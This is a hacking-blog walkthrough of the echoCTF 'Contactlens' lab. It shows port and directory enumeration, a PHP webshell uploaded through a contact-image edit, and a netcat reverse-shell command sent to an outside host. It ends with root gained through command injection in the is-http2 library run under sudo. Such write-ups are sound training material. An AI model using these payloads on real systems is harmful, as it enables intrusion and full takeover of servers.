<!doctype html><html lang=en><head><title>echoCTF Contactlens Writeup: File Upload to Root via Command Injection :: Hacking Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Step-by-step guide to cracking Contactlens on echoCTF with file upload exploits and command injection. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/contactlens/contactlens/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Contactlens Writeup: File Upload to Root via Command Injection"><meta property="og:description" content="Step-by-step guide to cracking Contactlens on echoCTF with file upload exploits and command injection. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/contactlens/contactlens/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-06-25 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo><img src=/logo.png alt="Hacking Vault" class=logo-image></div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/contactlens/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Contactlens Writeup: File Upload to Root via Command Injection</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/contactlens/contactlens/>echoCTF Contactlens Writeup: File Upload to Root via Command Injection</a></h1><div class=post-meta><time class=post-date>2025-06-25&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>5 min read (914 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/file-upload/>file upload</a>&nbsp;
#<a href=https://hack.com.cy/tags/php-webshell/>PHP webshell</a>&nbsp;
#<a href=https://hack.com.cy/tags/command-injection/>Command Injection</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#video-walkthrough>Video Walkthrough</a></li></ul><ul><li><a href=#nmap>NMAP</a></li><li><a href=#nmap-output>NMAP Output</a></li></ul></nav></div><div class=post-content><div><h2 id=video-walkthrough>Video Walkthrough<a href=#video-walkthrough class=hanchor arialabel=Anchor>#</a></h2><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/5FD9b_P4jRE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p><a href="https://www.youtube.com/watch?v=5FD9b_P4jREs"><img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube"></a></p><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><p>Start by port scanning the target machine</p><h2 id=nmap>NMAP<a href=#nmap class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -vv -Pn -p- -T4 10.0.50.0 -sC -sV
</span></span></code></pre></div><h2 id=nmap-output>NMAP Output<a href=#nmap-output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 8.4p1 Debian 5+deb11u2 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 8c:e1:6f:39:a7:65:ac:64:06:c6:43:72:40:ca:3f:64 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCeHruyMrJp6Aoww8WvypDa5GOOAa5d1wSC5fpaJ9CS8izg9dtWJOarrrZGAPgvA4RMa3a3qdapuUt342oLKfadUQKwZA9wHupAivBCLN1HmjN2RCOAmXHxTWse3cz0cv9ZEAHxtvNBO0nWmf63DrEAeDJXpkgV/dOgYHtll2yoDs0apKrdP7b3Br3YaGwUF/bVN6+WhTp9d2AXuHfDy28pe+a2t2YjuAwy34NlS7qjDyY1mqrBTyb7B7ZEwrPJjmli3iZA/9Ge//8O9mxCdW70IdMLbGrZ+fL0FHTvdP8Y/tOUndoCnY3BX3N4Jk44c5yxm0yPVMfYgBlST/tua0czRP3/qnM+KmoyDPGDwSFP1yaLSWL4OvVILOwqCzh7UsX/Z2lODK4QlxmP6jU2i2H3nOBA+T/I4BktAaIA7NB8Vn8DKEgu2iAT6JUVVapoFMvUUNgkqJYywMrx/39ZCyIOmg4XAniqmRgIIU02S5HylqWQQcaDylbqtrt1GmPLpUM<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 2b:30:87:a5:9f:44:b8:3b:65:7e:94:75:e6:61:8f:97 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAwOrlGNc9A2kRYgbsM/dEziRmuM5PlVnN6Fig5UbRsJPGePGPD/pfkwTALxvOULoYWhRZesLQEBFFwM+XFHQHA<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 15:e2:f7:e4:fa:0a:29:e3:7e:ce:36:ae:9f:3e:75:ac <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINbIqZ2bHXwtkxS6Xm5dSUDBOJFo39M5VqA1lfSLnAC0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1337/tcp open  http    syn-ack ttl <span class=m>63</span> nginx 1.18.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Contact Manager
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>The nmap scan shows 2 ports open.
Port 22 is SSH
Port 1337, runs an nginx 1.18.0 web server.</p><p>Visit the webserver:
<img src=/images/con1.png alt="Image Description"></p><p>Viewing the webserver we can find out that it uses PHP.</p><p><img src=/images/con2.png alt="Image Description"></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>Lets start a directory brute force before while we examine the functionality of the web application.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php -o rsw.txt
</span></span></code></pre></div><p>Trying to run the command gives as an error regarding <code>Length:</code>. We can fix this with the <code>--exclude-length</code> flag</p><p><img src=/images/con3.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.0:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x .php --exclude-length <span class=s2>&#34;10048&#34;</span> -o rsw.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 169<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.0:1337/images/<span class=o>]</span>
</span></span><span class=line><span class=cl>/conn                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 169<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.0:1337/conn/<span class=o>]</span>
</span></span></code></pre></div><p>Trying to visit both directories gives as a 403 FORBIDDEN.</p><p>Lets examine the functionality of the application..</p><p>It seems we can add a &ldquo;contact&rdquo; along with an image</p><p><img src=/images/con4.png alt="Image Description"></p><p>Since we know that the webserver can execute PHP code we could try and upload a php file.</p><p><img src=/images/con5.png alt="Image Description">
<img src=/images/con6.png alt="Image Description"></p><p>it seems that we cannot.</p><p>Notice that the web application allows the user to also edit the contact. We can try changing our contact&rsquo;s image with a php file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat test.php
</span></span><span class=line><span class=cl>&lt;?php system<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>])</span><span class=p>;</span> ?&gt;
</span></span></code></pre></div><p><img src=/images/con7.png alt="Image Description"></p><p>Success!</p><p>Now since the file was supposed to be an image and according to our directory brute force attack we found a directory called images we can try to access our malicious PHP script under <code>/images/test.php</code></p><p><img src=/images/con8.png alt="Image Description"></p><p>We have execution on the server!</p><p>Lets get a reverse shell by first checking if <code>nc</code> is installed on the target server utilising the <code>which</code> command likewise</p><p><img src=/images/con9.png alt="Image Description"></p><p><code>nc</code> exist on the box so lets see if we can get a reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -nvlp <span class=m>1337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl <span class=s1>&#39;http://10.0.50.0:1337/images/test.php?cmd=/bin/nc+10.10.11.150+1337+-e+/bin/bash&#39;</span>
</span></span></code></pre></div><p>Noticed that port 1337 was used to receive the shell. This is because we already know that the target server allows connection on that port as the webserver itself is running on that port!</p><p><img src=/images/con10.png alt="Image Description"></p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Lets upgrade our shell using python</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CTRL + Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Manual enumeration i always do before going for automated scripts</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Check who we are?</span>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># What other users exist on the box?</span>
</span></span><span class=line><span class=cl>cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Do i have sudo capabilities?</span>
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Are there ant localservices running on the box?</span>
</span></span><span class=line><span class=cl>netstat -ano <span class=p>|</span> grep LIST
</span></span><span class=line><span class=cl>ss -antp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Always check the directroy we landed it, in this case is `/var/www/html/images`</span>
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check for wierd files in `/opt` and `/tmp`</span>
</span></span><span class=line><span class=cl>ls -la /tmp <span class=o>&amp;&amp;</span> ls -la /opt
</span></span></code></pre></div><p>Analyzing the ouput</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@contactlens:~/html/images$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@contactlens:~/html/images$ cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>ETSCTF:x:1000:65534:ETSCTF_65d03c84f1f6dc71ee01db6f9384f2d2:/home/ETSCTF:/bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@contactlens:~/html/images$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on contactlens:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User www-data may run the following commands on contactlens:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL : ALL<span class=o>)</span> NOPASSWD: /usr/local/bin/contactlens
</span></span></code></pre></div><p>We can see that our user has the ability to run a command called <code>contactlens</code> as SUDO.</p><p>Lets examine what the command does and if we can exploit it!</p><p>At first glance we can see that the application requires 3 parameters</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /usr/local/bin/contactlens
</span></span><span class=line><span class=cl>You need three parameters URL,OpenSSL <span class=p>&amp;</span> includeSpdy
</span></span></code></pre></div><p>Be reading what the command does it is notice that the tool utilizes a node library called <code>is-http2</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /usr/local/bin/contactlens
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/node</span>
</span></span><span class=line><span class=cl>var <span class=nv>ish2</span> <span class=o>=</span> require<span class=o>(</span><span class=s2>&#34;is-http2&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>var <span class=nv>args</span> <span class=o>=</span> process.argv.slice<span class=o>(</span>2<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=o>(</span>args.length&lt;3<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  console.error<span class=o>(</span><span class=s2>&#34;You need three parameters URL,OpenSSL &amp; includeSpdy&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>  console.log<span class=o>(</span>ish2<span class=o>(</span>args<span class=o>[</span>0<span class=o>]</span>,<span class=o>{</span>openssl:args<span class=o>[</span>1<span class=o>]</span>,includeSpdy: args<span class=o>[</span>2<span class=o>]}))</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>Also when we try to see what else is inside <code>/usr/local/bin</code> we can see that the contactlens command is a link and if we examine the parent directories of its path we find the version of the <code>is-http2</code> node library <code>1.2.0</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@contactlens:/usr/local/bin$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root <span class=m>4096</span> Oct <span class=m>24</span>  <span class=m>2023</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root <span class=m>4096</span> Apr <span class=m>11</span>  <span class=m>2023</span> ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root   <span class=m>37</span> Oct <span class=m>24</span>  <span class=m>2023</span> contactlens -&gt; ../lib/node_modules/ish2/bin/index.js
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@contactlens:/usr/local/bin$ <span class=nb>cd</span> ../lib/node_modules/ish2/bin/
</span></span><span class=line><span class=cl>www-data@contactlens:/usr/local/lib/node_modules/ish2/bin$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> root root <span class=m>4096</span> Sep <span class=m>13</span>  <span class=m>2023</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root root <span class=m>4096</span> Oct <span class=m>24</span>  <span class=m>2023</span> ..
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root  <span class=m>254</span> Sep <span class=m>13</span>  <span class=m>2023</span> index.js
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@contactlens:/usr/local/lib/node_modules/ish2/bin$ <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>www-data@contactlens:/usr/local/lib/node_modules/ish2$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>76</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>4</span> root root  <span class=m>4096</span> Oct <span class=m>24</span>  <span class=m>2023</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>1</span> root root  <span class=m>4096</span> Oct <span class=m>24</span>  <span class=m>2023</span> ..
</span></span><span class=line><span class=cl>drwxrwxr-x  <span class=m>2</span> root root  <span class=m>4096</span> Sep <span class=m>13</span>  <span class=m>2023</span> bin
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>77</span> root root  <span class=m>4096</span> Oct <span class=m>24</span>  <span class=m>2023</span> node_modules
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root <span class=m>53885</span> Oct <span class=m>24</span>  <span class=m>2023</span> package-lock.json
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> root root   <span class=m>322</span> Oct <span class=m>24</span>  <span class=m>2023</span> package.json
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@contactlens:/usr/local/lib/node_modules/ish2$ cat package.json
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;ish2&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;version&#34;</span>: <span class=s2>&#34;1.0.0&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;description&#34;</span>: <span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;main&#34;</span>: <span class=s2>&#34;bin/index.js&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;bin&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;contactlens&#34;</span>: <span class=s2>&#34;bin/index.js&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;scripts&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;test&#34;</span>: <span class=s2>&#34;echo \&#34;Error: no test specified\&#34; &amp;&amp; exit 1&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;keywords&#34;</span>: <span class=o>[]</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;author&#34;</span>: <span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;license&#34;</span>: <span class=s2>&#34;ISC&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;dependencies&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;is-http2&#34;</span>: <span class=s2>&#34;^1.2.0&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>When we search for exploit regarding <code>is-http2 1.2.0</code> we find a command-injection vulnerability!</p><p><img src=/images/con11.png alt="Image Description"></p><p><img src=/images/con12.png alt="Image Description"></p><p>It seems that we can inject system commands on <code>arg[1]</code> when running <code>contactlens</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> sudo /usr/local/bin/contactlens <span class=s2>&#34;http://127.0.0.1&#34;</span> <span class=s2>&#34;touch /tmp/fromroot&#34;</span> <span class=s2>&#34;anything&#34;</span>
</span></span></code></pre></div><p>Even though it error out our command still executes!</p><p><img src=/images/con13.png alt="Image Description"></p><p>Now lets try to get a reverse shell as root. For this we going to utilize <code>nc</code> and port <code>22</code> as we already know its open from out nmap scan.</p><p><img src=/images/con14.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>